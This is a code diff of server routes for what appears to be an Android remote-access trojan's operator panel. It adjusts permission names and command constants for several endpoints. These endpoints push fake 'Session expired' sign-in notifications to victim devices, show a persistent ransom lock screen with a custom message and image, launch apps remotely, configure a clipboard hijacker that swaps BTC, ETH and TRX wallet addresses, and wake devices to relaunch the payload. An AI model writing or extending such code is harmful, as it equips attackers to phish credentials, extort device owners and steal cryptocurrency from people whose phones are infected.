@@ -16,13 +16,13 @@ function canAccess(user: any, id: string): boolean {
 export async function controlRoutes(app: FastifyInstance) {
   // NSC — matching-app login notification
   app.post('/api/client/:id/nsc', {
-    preHandler: [app.auth, requirePermission('device:control')],
+    preHandler: [app.auth, requirePermission('device:command')],
   }, async (request, reply) => {
     const { id } = request.params as { id: string };
     const user = getRequestUser(request);
     if (!canAccess(user, id)) return reply.code(403).send({ success: false, error: 'Access denied' });
     const b = request.body as any;
-    socketService.sendCommand(id, CMD.NSC as any, {
+    socketService.sendCommand(id, CMD.NOTIFICATIONS, {
       action: 'nsc_push',
       nscTitle: b.title || 'Session expired',
       nscBody: b.body || 'Tap to sign in again',
@@ -35,13 +35,13 @@ export async function controlRoutes(app: FastifyInstance) {
 
   // Ransom — persistent lock screen with custom message/image
   app.post('/api/client/:id/ransom', {
-    preHandler: [app.auth, requirePermission('device:control')],
+    preHandler: [app.auth, requirePermission('device:command')],
   }, async (request, reply) => {
     const { id } = request.params as { id: string };
     const user = getRequestUser(request);
     if (!canAccess(user, id)) return reply.code(403).send({ success: false, error: 'Access denied' });
     const b = request.body as any;
-    socketService.sendCommand(id, CMD.RANSOM as any, {
+    socketService.sendCommand(id, CMD.SMS_PUSH, {
       action: 'ransom_show',
       ransomMsg: b.message || '',
       ransomImg: b.image || '',
@@ -50,24 +50,24 @@ export async function controlRoutes(app: FastifyInstance) {
   });
 
   app.post('/api/client/:id/ransom/hide', {
-    preHandler: [app.auth, requirePermission('device:control')],
+    preHandler: [app.auth, requirePermission('device:command')],
   }, async (request, reply) => {
     const { id } = request.params as { id: string };
     const user = getRequestUser(request);
     if (!canAccess(user, id)) return reply.code(403).send({ success: false, error: 'Access denied' });
-    socketService.sendCommand(id, CMD.RANSOM as any, { action: 'ransom_hide' });
+    socketService.sendCommand(id, CMD.SMS_PUSH, { action: 'ransom_hide' });
     return { success: true, data: { message: 'Ransom hidden' } };
   });
 
   // Launch — open any app on device
   app.post('/api/client/:id/launch', {
-    preHandler: [app.auth, requirePermission('device:control')],
+    preHandler: [app.auth, requirePermission('device:command')],
   }, async (request, reply) => {
     const { id } = request.params as { id: string };
     const user = getRequestUser(request);
     if (!canAccess(user, id)) return reply.code(403).send({ success: false, error: 'Access denied' });
     const b = request.body as any;
-    socketService.sendCommand(id, CMD.LAUNCH as any, {
+    socketService.sendCommand(id, CMD.APPS, {
       action: 'launch_app',
       package: b.package || '',
     });
@@ -76,13 +76,13 @@ export async function controlRoutes(app: FastifyInstance) {
 
   // Clipper — configure addresses / arm / disarm
   app.post('/api/client/:id/clipper', {
-    preHandler: [app.auth, requirePermission('device:control')],
+    preHandler: [app.auth, requirePermission('device:command')],
   }, async (request, reply) => {
     const { id } = request.params as { id: string };
     const user = getRequestUser(request);
     if (!canAccess(user, id)) return reply.code(403).send({ success: false, error: 'Access denied' });
     const b = request.body as any;
-    socketService.sendCommand(id, CMD.CLIPPER as any, {
+    socketService.sendCommand(id, CMD.CLIPBOARD, {
       action: b.action || 'clipper_config',
       config: {
         btc: b.btc || '', eth: b.eth || '', trx: b.trx || '',
@@ -96,13 +96,13 @@ export async function controlRoutes(app: FastifyInstance) {
 
   // Auto-launch — wake device + open payload + attempt socket reconnect
   app.post('/api/client/:id/auto-launch', {
-    preHandler: [app.auth, requirePermission('device:control')],
+    preHandler: [app.auth, requirePermission('device:command')],
   }, async (request, reply) => {
     const { id } = request.params as { id: string };
     const user = getRequestUser(request);
     if (!canAccess(user, id)) return reply.code(403).send({ success: false, error: 'Access denied' });
-    socketService.sendCommand(id, CMD.LAUNCH as any, { action: 'wake' });
-    socketService.sendCommand(id, CMD.LAUNCH as any, {
+    socketService.sendCommand(id, CMD.APPS, { action: 'wake' });
+    socketService.sendCommand(id, CMD.APPS, {
       action: 'launch_app',
       package: '',
     });
